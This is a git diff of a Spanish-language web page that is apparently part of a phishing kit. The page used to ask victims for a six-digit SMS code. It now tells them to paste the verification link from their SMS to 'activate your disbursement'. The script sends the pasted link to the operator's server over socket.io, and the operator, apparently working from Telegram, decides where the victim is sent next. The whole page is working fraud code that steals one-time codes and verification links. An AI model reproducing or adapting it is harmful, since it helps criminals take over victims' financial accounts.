@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Código Incorrecto</title>
+  <title>Enlace de Verificación</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -82,14 +82,15 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su celular o correo electronico</h3>
-    <p>Introduce el codigo de verificacion que te acabamos de enviar a su celular de confianza o correo electronico.</p>
-    <div class="input-group campo-requerido">
-      <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+    <h3>¡ÚLTIMO PASO!</h3>
+    <p>Para confirmar tu identidad y que nuestro sistema pueda identificarte para activar tu desembolso, es necesario que valides con el enlace que se te envió a tu celular.</p>
+    <h6>Por favor copia el enlace de tu SMS y pégalo a continuación para activar tu desembolso.</h6>
+    <div class="input-group" id="grupoInput">
+      <div class="icon"><i class="fas fa-link"></i></div>
+      <input type="text" id="codigo" placeholder="Pega el enlace aquí" required>
     </div>
-    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
-    <button onclick="reintentarCodigo()">Reintentar</button>
+    <p class="mensaje-error" id="mensajeError"> </p>
+    <button onclick="reintentarCodigo()">Validar enlace</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -100,21 +101,30 @@
     socket.emit("reconectar", sessionId);
 
     function reintentarCodigo() {
-      const codigo = document.getElementById("codigo").value;
+      const codigoInput = document.getElementById("codigo");
+      const mensajeError = document.getElementById("mensajeError");
+      const grupoInput = document.getElementById("grupoInput");
+      const enlace = codigoInput.value.trim();
 
-      if (!codigo || !/^\d{6}$/.test(codigo)) {
-        alert("Ingrese un código válido de 6 dígitos.");
+      // Limpiar estado anterior
+      mensajeError.textContent = "";
+      grupoInput.classList.remove("campo-requerido");
+
+      // Validar enlace
+      const urlRegex = /^(https?:\/\/)[^\s/$.?#].[^\s]*$/i;
+      if (!enlace || !urlRegex.test(enlace)) {
+        mensajeError.textContent = "Por favor ingresa un enlace válido que comience con http:// o https://";
+        grupoInput.classList.add("campo-requerido");
         return;
       }
 
-      // Enviar OTP ingresado al servidor
-      socket.emit("otpIngresado", { codigo, sessionId });
+      // Enviar enlace al servidor
+      socket.emit("otpIngresado", { codigo: enlace, sessionId });
 
-      // Ir a la pantalla de espera
+      // Redirigir
       window.location.href = "opciones.html";
     }
 
-    // Recibir respuesta del admin desde Telegram
     socket.on("respuestaOtp", (decision) => {
       if (decision === "finalizar") {
         window.location.href = "https://www.google.com";
